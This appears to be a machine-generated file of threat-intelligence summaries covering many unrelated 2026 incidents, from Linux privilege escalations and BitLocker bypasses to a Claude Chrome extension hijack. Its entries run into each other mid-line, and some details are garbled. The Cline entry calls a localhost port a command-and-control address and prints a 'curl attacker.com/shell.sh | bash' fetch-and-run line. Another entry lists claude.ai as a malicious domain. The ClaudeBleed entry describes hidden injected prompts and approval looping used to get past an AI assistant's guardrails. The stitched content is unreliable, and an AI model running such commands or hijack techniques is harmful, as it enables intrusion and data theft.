doc_summary: Initial access broker KongTuke has shifted tactics to use Microsoft Teams for social engineering attacks, gaining persistent access to corporate networks in under five minutes. The threat actor convinces users to execute a PowerShell command that delivers ModeloRAT malware, previously seen in ClickFix attacks. KongTuke sells network access to ransomware operators. The campaign, active since April 2026, uses Unicode whitespace tricks to impersonate IT staff. The PowerShell command downloads a ZIP from Dropbox containing a WinPython environment to launch ModeloRAT, which collects system data and exfiltrates files. ReliaQuest notes the evolution of ModeloRAT and recommends restricting external Teams federation and using indicators of compromise for detection.
kill_chain_summary: The attack begins with reconnaissance, where KongTuke identifies potential targets within corporate networks. Weaponization involves preparing ModeloRAT for delivery. Delivery is executed via Microsoft Teams, where victims are tricked into executing a PowerShell command. Exploitation occurs as the command downloads and installs ModeloRAT. Installation is achieved through a scheduled task, ensuring persistence. Command and control are established using web protocols, allowing the adversary to communicate with compromised systems. Finally, actions on objectives involve collecting and exfiltrating data, including screenshots and files.

diamond_model_summary: The incident involves a high-severity privilege escalation vulnerability in the Linux kernel's XFRM ESP-in-TCP subsystem. The vulnerability is part of the Dirty Frag class and affects all Linux kernels released before May 13, 2026. doc_summary: Linux distros are addressing a high-severity kernel privilege escalation vulnerability in the XFRM ESP-in-TCP subsystem. This flaw, discovered by Zellic's head of assurance, allows unprivileged local attackers to gain root privileges by writing arbitrary bytes to the kernel page cache of read-only files. The vulnerability, part of the Dirty Frag class, affects all Linux kernels released before May 13, 2026. It involves chaining two kernel flaws: the xfrm-ESP Page-Cache Write and a RxRPC Page-Cache Write issue. CISA has issued warnings and mitigation guidance, emphasizing the risk to federal systems. Linux users are urged to apply patches or use mitigations similar to those for Dirty Frag, though this may disrupt AFS and IPsec VPNs.
kill_chain_summary: The attack chain involves exploiting a logic bug in the Linux XFRM ESP-in-TCP subsystem to achieve privilege escalation. Title: Zero-Day Vulnerabilities in Microsoft Products: YellowKey and GreenPlasma

Victim.Description: The vulnerabilities affect users of Windows 11 and Windows Server 2022/2025.

diamond_model_summary: The incident involves an anonymous cybersecurity researcher, Chaotic Eclipse, who disclosed two zero-day vulnerabilities, YellowKey and GreenPlasma, affecting Microsoft products. The adversary's motivation stems from dissatisfaction with Microsoft's vulnerability disclosure process. The capabilities demonstrated include exploiting zero-day vulnerabilities in Windows 11 and Windows Server 2022/2025. The infrastructure details are limited, but the victims are users of the affected Microsoft products. The impact severity is high due to the potential for unauthorized access and exploitation.
doc_summary: An anonymous cybersecurity researcher, known as Chaotic Eclipse, disclosed two zero-day vulnerabilities affecting Microsoft products. The first, YellowKey, is a BitLocker bypass vulnerability in the Windows Recovery Environment, impacting Windows 11 and Windows Server 2022/2025. It involves using specially crafted FsTx files on a USB drive to trigger a shell with BitLocker protections turned on. The second, GreenPlasma, is a privilege escalation vulnerability in the Windows Collaborative Translation Framework (CTFMON), allowing an unprivileged user to create arbitrary memory section objects. The researcher previously disclosed three Microsoft Defender zero-days and expressed dissatisfaction with Microsoft's vulnerability disclosure process. The vulnerabilities have been actively exploited, and Microsoft has been urged to address them promptly. Security researcher Will Dormann confirmed the YellowKey vulnerability, highlighting the ability of a System Volume Information\FsTx directory to modify another volume's contents. Intrinsec detailed an attack chain against BitLocker, leveraging a boot manager downgrade to bypass encryption protection. Microsoft plans to retire old PCA 2011 certificates to mitigate risks.
kill_chain_summary: The kill chain involves the weaponization of zero-day vulnerabilities, YellowKey and GreenPlasma, by the adversary Chaotic Eclipse. doc_summary: Fragnesia is a new variant of the Dirty Frag Linux local privilege escalation vulnerability, tracked as CVE-2026-46300 with a CVSS score of 7.8. Discovered by William Bowling of the V12 security team, it affects the Linux kernel's XFRM ESP-in-TCP subsystem, allowing unprivileged local attackers to gain root access by modifying read-only file contents in the kernel page cache. Multiple Linux distributions have released advisories, and a proof-of-concept exploit is available. The vulnerability is similar to Copy Fail and Dirty Frag, enabling root access by corrupting the page cache memory of the /usr/bin/su binary. Mitigations include disabling esp4, esp6, and related xfrm/IPsec functionality, restricting local shell access, and hardening containerized workloads. A threat actor named berz0k is selling a zero-day Linux LPE exploit for $170,000, claiming it works on multiple major Linux distributions. AppArmor restrictions may serve as partial mitigation, and a patch is available.

doc_summary: YellowKey is a newly disclosed Windows zero-day vulnerability that allows attackers to bypass BitLocker protection on encrypted drives without needing the victim's recovery key. The exploit, published by the researcher Nightmare-Eclipse, affects Windows 11, Windows Server 2022, and Windows Server 2025. It requires physical access to the target device and exploits a weakness in the Windows Recovery Environment (WinRE) to gain access to the protected volume. The attack involves using specially prepared files on a USB device or writing them to the EFI system partition. Security researcher Will Dormann noted that the FsTx log on removable media could modify files on a different volume when replayed by WinRE, suggesting a deeper flaw in cross-volume NTFS transaction replay. The vulnerability is unpatched, raising concerns about potential copycat attacks. The exploit does not affect Windows 10, indicating a problem with newer WinRE behavior. The same researcher also disclosed GreenPlasma, another Windows flaw. Organizations using affected systems are advised to review BitLocker settings, WinRE exposure, and physical security controls.

doc_summary: The Iran-linked hacking group MuddyWater, also known as Seedworm or Static Kitten, launched a cyber-espionage campaign targeting at least nine high-profile organizations across multiple sectors and countries. Victims included a major South Korean electronics manufacturer, government agencies, an international airport in the Middle East, industrial manufacturers in Asia, and educational institutions. Symantec researchers reported that the attackers spent a week inside the network of a South Korean electronics manufacturer in February 2026. The campaign focused on industrial and intellectual property theft, government espionage, and access to downstream customers or corporate networks. Seedworm used DLL sideloading, leveraging binaries like 'fmapp.exe' and 'sentinelmemoryscanner.exe' to load malicious DLLs. PowerShell was heavily used for reconnaissance, persistence, and credential theft. Data exfiltration was conducted using sendit.sh, a public file-sharing service.

Weaponization involved preparing malicious DLLs for sideloading. Delivery was achieved through legitimate software, leading to exploitation via DLL sideloading. Installation of persistence mechanisms was done through registry modifications. Command and control were established using SOCKS5 tunnels, and actions on objectives included data exfiltration using sendit.sh and credential theft. The campaign's use of legitimate tools and services marks a shift towards quieter attacks.

diamond_model_summary: The incident involves a critical use-after-free vulnerability in Exim's BDAT message body parsing, identified as CVE-2026-45185. doc_summary: Exim, an open-source Mail Transfer Agent for Unix-like systems, has released security updates to address a critical use-after-free vulnerability, CVE-2026-45185, also known as Dead.Letter. This vulnerability affects Exim versions 4.97 to 4.99.2 when configured with GnuTLS. Discovered by Federico Kirschbaum of XBOW, the flaw occurs during BDAT message body parsing when a TLS close_notify alert is sent before the body transfer is complete, leading to heap corruption and potential code execution. The vulnerability has been described as one of the highest-caliber bugs in Exim, requiring minimal server configuration to exploit. Exim has addressed the issue in version 4.99.3, urging users to upgrade immediately as no mitigations exist. This incident highlights the critical nature of maintaining up-to-date security patches to prevent exploitation.

doc_summary: A critical vulnerability named ClaudeBleed has been identified in Anthropic's AI assistant, compromising its security. The flaw in the Claude Chrome extension allows malicious add-ons to hijack the AI, even with zero declared permissions, leading to data theft from Gmail, Google Drive, and GitHub. The issue stems from a systemic trust boundary violation in the extension's architecture, where the externally_connectable manifest setting fails to authenticate specific scripts. Attackers can inject content scripts, gaining high-level privileges and issuing hidden prompts. Techniques like approval looping and perception manipulation enable attackers to bypass guardrails, exfiltrate data, and perform unauthorized actions. Despite a patch in version 1.0.70, the core vulnerability remains exploitable, highlighting the prioritization of usability over security.

Delivery occurs through the deployment of these extensions to target systems. Exploitation involves leveraging the trust boundary violation to execute malicious scripts. Installation is achieved by embedding scripts within the Claude environment. Command and control are maintained through the injected scripts, allowing attackers to issue commands to the AI assistant. Actions on objectives include data exfiltration and unauthorized actions, such as summarizing emails and stealing files from Google Drive and GitHub.

Victim.Description: Developers using the Cline AI coding assistant's kanban package are at risk.
Victim.Security_Posture: Vulnerable due to missing authentication and origin validation.

diamond_model_summary: The incident involves a critical vulnerability in the Cline AI kanban package, allowing adversaries to execute remote code, steal data, and perform denial-of-service attacks. The adversary exploits WebSocket vulnerabilities, targeting developers using the kanban package. The attack infrastructure includes malicious websites that exploit the vulnerability, and the adversary's capabilities include executing arbitrary commands and exfiltrating data. doc_summary: A critical security vulnerability, CVE-2026-44211, in the Cline AI coding assistant's kanban package exposes developers to remote code execution, data theft, and denial-of-service attacks. Disclosed by security researcher Sagilayani, the flaw affects all versions before v2.13.0 and has a CVSS v3.1 score of 9.3. The vulnerability arises from missing authentication and origin validation in WebSocket connections, allowing attackers to connect to the kanban server on 127.0.0.1:3484 without restriction. The attack involves info leak, session detection, terminal hijack, and task termination. No patch is available, and the vulnerability affects macOS, Linux, and Windows systems. Mitigations include validating the Origin header, generating a random secret token, and adding authentication checks.
kill_chain_summary: The attack begins with reconnaissance, where the adversary identifies vulnerable systems running the Cline AI kanban package. Weaponization involves crafting malicious websites to exploit WebSocket vulnerabilities. Delivery occurs when developers visit these websites, leading to exploitation of the vulnerability. The adversary establishes command and control using WebSocket connections and performs actions on objectives, including data exfiltration and denial-of-service attacks. The attack leverages missing authentication and origin validation in WebSocket connections, affecting developers across multiple operating systems.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes IP addresses and command lines as indicators. The adversary exploits WebSocket vulnerabilities, using IP addresses like 127.0.0.1:3484 for command and control. Command lines such as 'curl https://attacker.com/shell.sh | bash' are used for remote code execution. These indicators are crucial for detection and response, as they provide insight into the adversary's tactics and techniques. The lack of authentication and origin validation in WebSocket connections is a significant weakness exploited by the adversary.

diamond_model_summary: The TrickMo Android banking trojan targets users in France, Italy, and Austria, leveraging The Open Network (TON) for command-and-control (C2) communications. doc_summary: TrickMo is an Android banking trojan targeting users in France, Italy, and Austria. The latest variant, TrickMo C, observed by ThreatFabric, uses The Open Network (TON) for command-and-control (C2) communications. It includes features like SSH tunneling, SOCKS5 proxying, and network reconnaissance tools such as curl, dnslookup, ping, telnet, and traceroute. TrickMo abuses Android's accessibility services to hijack OTPs and phish credentials. The malware is distributed via phishing websites and dropper apps masquerading as TikTok and Google Play Services. It turns infected devices into network exit nodes, complicating IP-based fraud detection. The malware's use of TON for C2 reduces the effectiveness of traditional takedown efforts.
kill_chain_summary: TrickMo follows a sophisticated kill chain, starting with reconnaissance using network tools like curl and dnslookup. Delivery occurs via phishing websites and dropper apps, exploiting Android accessibility services for exploitation. Installation involves a runtime-loaded APK for persistence. Command and control are achieved through TON, using multi-hop proxies for stealth. Actions on objectives include credential theft and network pivoting, targeting banking and cryptocurrency users.

doc_summary: A critical unpatched vulnerability in Open WebUI allows attackers to exploit a stored Cross-Site Scripting (XSS) flaw in the profile image upload feature, leading to remote code execution (RCE) and account hijacking. Discovered by Metin Yunus Kandemir, the flaw involves improper validation of base64-encoded profile pictures, allowing malicious JavaScript code to be executed. Attackers can craft payloads containing reverse shells, which are uploaded as profile photos. When victims visit the image link, the code executes in their context, potentially compromising administrators and standard users alike. The vulnerability remains unpatched in version 0.7.2, and mitigation involves restricting media types to safe formats. The disclosure process was contentious, with developers initially dismissing the report as a duplicate, prompting public disclosure by researchers.

doc_summary: TeamPCP, a threat actor, executed a supply chain attack targeting npm and PyPI packages from companies like TanStack, UiPath, and Mistral AI. The malware spread to other packages, including those in PyPI, and featured a geofenced destructive payload targeting systems in Israel and Iran.

doc_summary: California Attorney General Rob Bonta announced a $12.75 million settlement with General Motors (GM) over allegations of violating the California Consumer Privacy Act (CCPA). The violations stem from GM's illegal collection and sale of Californians' driving and location data to data brokers, including Verisk Analytics, between 2020 and 2024. The data was collected through GM's OnStar subsidiary and its Smart Driver system, intended for driver-scoring products related to insurance. The U.S. Federal Trade Commission (FTC) previously criticized GM for unlawful data collection. California authorities stated GM failed to notify consumers or obtain consent for data collection, retaining data longer than necessary and repurposing it for sale. The $12.75 million civil penalty is a record in California's history and the first enforcement action focused on data minimization rules. GM's data sales did not result in higher insurance premiums for California drivers due to state law prohibiting insurers from using driving data to set rates.

Title: Exploitation of cPanel Vulnerability CVE-2026-41940 by Mr_Rot13

Victim.Description: Victims are cPanel users across multiple regions, targeted for unauthorized access and data theft.
Victim.Geography: Global, with significant activity in Germany, United States, Brazil, and Netherlands.

diamond_model_summary: The incident involves the threat actor Mr_Rot13 exploiting a critical cPanel vulnerability, CVE-2026-41940, to deploy a backdoor named Filemanager. The adversary's capability includes exploiting public-facing applications and using ROT13 encoding for data exfiltration. The infrastructure involves domains like cp.dene.de.com and wrned.com for command and control. Victims are cPanel users globally, with significant activity in Germany, United States, Brazil, and Netherlands.
doc_summary: A threat actor named Mr_Rot13 exploited a critical cPanel flaw, CVE-2026-41940, to deploy a backdoor named Filemanager. This vulnerability allows authentication bypass, enabling remote attackers to control cPanel. QiAnXin XLab reported multiple threat actors exploiting this flaw for cryptocurrency mining, ransomware, botnet propagation, and backdoor implantation. Over 2,000 attacker IPs from Germany, United States, Brazil, and Netherlands are involved. A shell script downloads a Go-based infector from cp.dene.de.com, implants an SSH key, and drops a PHP web shell for remote command execution. JavaScript code injects a fake login page to steal credentials, encoded with ROT13, and transmits them to wrned.com. The attack culminates in a cross-platform backdoor affecting Windows, macOS, and Linux. Sensitive data is exfiltrated to a Telegram group by user 0xWR. The C2 domain was first registered in October 2020, with low detection rates for Mr_Rot13's infrastructure.
kill_chain_summary: The attack begins with the exploitation of CVE-2026-41940, allowing the adversary to bypass authentication and gain access to cPanel environments. A shell script is used to deliver a Go-based infector, which installs a backdoor and implants an SSH key for persistence. The adversary uses JavaScript injection to steal credentials, which are exfiltrated to a C2 domain. The attack culminates in the deployment of a cross-platform backdoor, affecting Windows, macOS, and Linux systems.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes domain names like cp.dene.de.com and wrned.com, which are critical for the adversary's command and control operations. The use of ROT13 encoding for data exfiltration and the deployment of a cross-platform backdoor are significant TTPs. Monitoring network traffic for connections to these domains and detecting unauthorized SSH key additions are key detection strategies.

Title: CVE-2026-0073: Critical Android ADB Vulnerability Exploited

Victim.Description: Android devices with wireless ADB enabled, including developer phones and enterprise test fleets.
Victim.Security_Posture: Vulnerable if wireless ADB is enabled and unpatched.

diamond_model_summary: The incident involves the exploitation of CVE-2026-0073, a critical Android vulnerability, by adversaries seeking unauthorized shell access via the ADB component. The capability involves exploiting a logic error in the wireless ADB mutual-authentication path, allowing attackers to impersonate a paired ADB host. The infrastructure requires network reachability to the ADB-over-TCP service, commonly through wireless debugging. Victims include Android devices with wireless ADB enabled, affecting developer phones, lab devices, and enterprise test fleets. The severity is critical due to the potential for unauthorized access and control of Android devices.
doc_summary: CVE-2026-0073 is a critical Android vulnerability documented in Google's May 2026 security bulletin. It involves a no-interaction remote code execution flaw in the adbd component, allowing attackers to execute code as the shell user without device owner interaction. The vulnerability stems from a logic error in the wireless ADB mutual-authentication path, specifically in the adbd_tls_verify_cert function inside auth.cpp. This flaw allows a crafted TLS client certificate to be incorrectly treated as trusted, enabling unauthorized remote systems to impersonate a paired ADB host and open a shell session. The issue is an authentication bypass, not a memory-corruption problem, making it particularly notable. The vulnerability affects developer phones, lab devices, emulators, and enterprise test fleets with wireless debugging enabled. Exploitation requires network reachability to the device's ADB-over-TCP service, commonly through wireless debugging. Public exploit references suggest researchers have moved the issue from advisory language to a reproducible attack path, changing the risk profile for organizations relying on Android devices. Google has addressed the issue in the May 2026 Android Security Bulletin, and defenders are urged to patch affected devices and disable wireless debugging where not needed.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where adversaries identify Android devices with wireless ADB enabled. Weaponization involves developing or obtaining a proof-of-concept exploit for CVE-2026-0073. Exploitation occurs when adversaries use the exploit to gain shell access. Command and control is maintained via shell access, allowing adversaries to perform system inspection and package interaction. The actions on objectives stage involves adversaries executing commands to discover files and directories on the compromised device. The incident highlights the importance of patching and disabling unnecessary services to prevent exploitation.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the use of a proof-of-concept exploit for CVE-2026-0073, which is a significant tool for adversaries. The exploitation of the ADB-over-TCP service represents a network host artifact. The TTPs employed include authentication bypass and remote code execution. No specific hash values, IP addresses, or domain names were identified in the incident. The scoring reflects the presence of tools and TTPs, emphasizing the need for defenders to focus on detecting and mitigating these elements to disrupt adversary operations.

Title: PHP SOAP Extension Vulnerabilities Leading to RCE and UAF Exploits

Victim.Description: Servers running vulnerable PHP versions with SOAP extension.

diamond_model_summary: The incident involves advanced threat actors exploiting vulnerabilities in the PHP SOAP extension, particularly CVE-2026-6722, which allows Remote Code Execution. The adversaries demonstrate high sophistication by leveraging Use-After-Free and NULL pointer dereference vulnerabilities. The infrastructure targeted includes web servers running vulnerable PHP versions, with the primary objective being unauthorized control and potential data manipulation.
doc_summary: Recently disclosed vulnerabilities in PHP, particularly within its SOAP extension, have raised alarms in the cybersecurity community. A high-severity vulnerability, CVE-2026-6722, allows Remote Code Execution (RCE) by exploiting a Use-After-Free (UAF) flaw in the ext-soap package. Other vulnerabilities include CVE-2026-7261, a moderate-severity UAF tied to SoapServer session persistence, and CVE-2026-7262, a NULL pointer dereference in the Apache Map decoder. Additional out-of-bounds read vulnerabilities, CVE-2026-7258 and CVE-2026-6104, affect PHP core functions like urldecode() and mb_convert_encoding(). These issues impact PHP versions before 8.2.31, 8.3.31, 8.4.21, and 8.5.6. The PHP development team has released patches to address these flaws. Researchers BrettGervasoni, iliaal, xfourj, and AkshayJainG disclosed these vulnerabilities, with remediation patches developed by iluuu1994 and reviewed by ndossche.
kill_chain_summary: The attack chain begins with the weaponization of malicious XML payloads to exploit Use-After-Free vulnerabilities in the PHP SOAP extension. The exploitation phase involves gaining initial access through public-facing application vulnerabilities, leading to potential Remote Code Execution. The attackers aim to execute arbitrary code on affected servers, posing a high risk to server integrity and data security.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes TTPs such as Use-After-Free exploitation and Remote Code Execution, which are challenging for defenders to address. The vulnerabilities CVE-2026-6722, CVE-2026-7261, and others represent significant pain points due to their potential for severe impact. diamond_model_summary: The GhostLock attack involves an adversary exploiting the CreateFileW API to lock files on enterprise network attached storage systems. doc_summary: The GhostLock attack, disclosed in May 2026 by security researcher Kim Dvash, demonstrates a novel technique to paralyze enterprise file systems without encrypting data. This attack leverages the CreateFileW API in Windows, allowing a low-privileged domain user account to lock files on a network attached storage system. By setting the sharing mode parameter to 0, the system grants an exclusive deny-share handle, preventing other processes from accessing the files. The attack bypasses traditional cybersecurity defenses, leaving no forensic signature and evading detection by behavioral AI models and anomaly detectors. The only reliable indicator is the number of simultaneous exclusive handles in the storage management session table. Security teams must update incident response runbooks to coordinate with storage administrators to terminate offending network sessions.
kill_chain_summary: The GhostLock attack follows a kill chain that begins with reconnaissance to identify vulnerable enterprise file systems. Weaponization involves developing the GhostLock tool to exploit the CreateFileW API. Delivery is achieved through phishing campaigns to gain access to low-privileged accounts. Detection relies on monitoring storage management session tables for excessive exclusive handles, and remediation requires coordination with storage administrators to terminate offending sessions.

doc_summary: cPanel and WebHost Manager (WHM) are critical administrative control panels used by hosting providers globally to manage servers, websites, and databases. On May 8, 2026, researchers disclosed three severe security flaws impacting cPanel, WHM, and the WP Squared platform. These vulnerabilities expose hosting environments to arbitrary code execution, sensitive file exposure, and denial-of-service (DoS) conditions. The most severe flaw, CVE-2026-29202, involves a critical Perl code-injection vulnerability in the create_user API call. CVE-2026-29201 exposes servers to arbitrary file reads via the feature::LOADFEATUREFILE adminbin call. CVE-2026-29203 stems from unsafe symlink handling, allowing local users to execute chmod commands on arbitrary files. Emergency patches have been released, and system administrators must urgently update their infrastructure to prevent exploitation.
kill_chain_summary: The attack begins with the exploitation of vulnerabilities in cPanel, WHM, and WP Squared platforms. The adversaries leverage a Perl code-injection vulnerability (CVE-2026-29202) to execute arbitrary code, an arbitrary file read vulnerability (CVE-2026-29201) to access sensitive data, and a symlink handling vulnerability (CVE-2026-29203) to manipulate file permissions. These actions enable threat actors to gain unauthorized access and potentially disrupt services. Emergency patches have been released to mitigate these threats.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes vulnerabilities (CVE-2026-29202, CVE-2026-29201, CVE-2026-29203) as TTPs, which are the most challenging for adversaries to change. Title: Malvertising Campaign Abusing Google Ads and Claude.ai Shared Chats

Victim.Description: The campaign targets macOS users searching for Claude-related downloads.
Victim.Security_Posture: Vulnerable to social engineering and malvertising tactics.

diamond_model_summary: The adversary in this incident is leveraging legitimate platforms like Google Ads and Claude.ai shared chats to conduct a sophisticated malvertising campaign. The campaign targets macOS users by delivering malware disguised as legitimate installation instructions. The adversary's capability includes using base64 encoded shell scripts and macOS's built-in scripting engine to execute malware in memory, making detection challenging. The infrastructure involves legitimate domains, complicating attribution and mitigation efforts. Victims are primarily macOS users searching for Claude-related downloads, with data exfiltration focusing on browser credentials and Keychain contents.
doc_summary: Attackers are exploiting Google Ads and Claude.ai shared chats in a malvertising campaign targeting users searching for 'Claude mac download'. The campaign involves sponsored search results leading to malware installation instructions on macOS. Berk Albayrak, a security engineer at Trendyol Group, identified a Claude.ai shared chat posing as an official 'Claude Code on Mac' guide, attributed to 'Apple Support'. The chat instructs users to open Terminal and paste a command that downloads and executes malware. BleepingComputer confirmed the attack through separate infrastructure. The campaign uses different domains and payloads, with base64 instructions downloading an encoded shell script. The script checks for Russian or CIS-region keyboard input, collects victim profiling data, and executes a second-stage payload via macOS's scripting engine. Albayrak's variant skips profiling, directly harvesting browser credentials and macOS Keychain contents, identified as a MacSync infostealer variant. The campaign abuses Anthropic's real domain, hosting malicious instructions inside Claude's shared chat feature. Users are advised to download the native Claude app directly from claude.ai and treat terminal command instructions with caution.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where the adversary identifies potential victims through search queries related to Claude downloads. Weaponization involves crafting malicious instructions disguised as legitimate guides. Delivery is achieved via Google Ads and Claude.ai shared chats, leading to exploitation when users execute the provided commands. Installation occurs through in-memory execution of malware, followed by command and control communication with the attacker's server. Finally, actions on objectives involve exfiltrating sensitive data such as credentials and Keychain contents.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes domain names like claude.ai, which are used for malware distribution. The use of legitimate domains and in-memory execution tactics increases the difficulty of detection and response. The adversary's tools include base64 encoded shell scripts and macOS's built-in scripting engine, which are challenging to detect and mitigate. The TTPs employed involve malvertising, social engineering, and data exfiltration, indicating a high level of sophistication and persistence in the attack strategy.

Title: Critical Vulnerability in Ollama Framework: CVE-2026-7482

Victim.Description: Organizations using Ollama framework for local LLM execution.

diamond_model_summary: The incident involves a critical vulnerability in the Ollama framework, codenamed Bleeding Llama, which allows remote attackers to exploit a heap out-of-bounds read flaw. The adversary can exfiltrate sensitive data from the process memory of vulnerable servers. The attack leverages the unsafe package in the GGUF model loader, specifically targeting the WriteTo() function. The infrastructure affected includes Ollama servers and Windows clients, with the potential for data exfiltration and remote code execution.
doc_summary: Cybersecurity researchers have disclosed a critical security vulnerability in Ollama, tracked as CVE-2026-7482, with a CVSS score of 9.1. The vulnerability, codenamed Bleeding Llama by Cyera, affects over 300,000 servers globally. It involves an out-of-bounds read flaw in the GGUF model loader, allowing remote, unauthenticated attackers to leak process memory. The flaw stems from the unsafe package used in the WriteTo() function, enabling operations that bypass memory safety. Exploitation can lead to data exfiltration, including environment variables, API keys, and user data. Additionally, Striga researchers identified two vulnerabilities in Ollama's Windows update mechanism, allowing persistent code execution. Users are advised to apply fixes, limit network access, and deploy authentication proxies.
kill_chain_summary: The attack begins with the weaponization of malicious GGUF files, followed by their delivery to vulnerable Ollama servers. Exploitation occurs through a heap out-of-bounds read vulnerability, allowing attackers to access sensitive data. The attack chain includes potential exfiltration of data via the /api/push endpoint. Remediation steps include applying patches, limiting network access, and deploying authentication proxies.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the exploitation of a specific vulnerability (CVE-2026-7482) in the Ollama framework. The attack leverages a crafted GGUF file to trigger a heap out-of-bounds read, leading to data exfiltration. The lack of specific indicators such as hashes or IP addresses limits the ability to apply traditional detection methods, emphasizing the need for patching and network access controls.

doc_summary: The JDownloader website was compromised in a supply chain attack between May 6 and May 7, 2026, affecting Windows and Linux installers. Attackers modified download links to distribute a Python-based remote access trojan (RAT) via malicious installers. The compromise was reported by a user named 'PrinceOfNightSky' on Reddit, who noticed Microsoft Defender flagging the installers. The attackers exploited an unpatched vulnerability in the website's content management system, allowing them to alter download links without authentication. The malicious Windows payload deployed a heavily obfuscated Python-based RAT, while the Linux installer injected code to download and install ELF binaries. Users who downloaded the affected installers are advised to reinstall their operating systems and reset passwords due to potential credential compromise. The incident highlights the increasing trend of targeting popular software tools' websites for malware distribution.
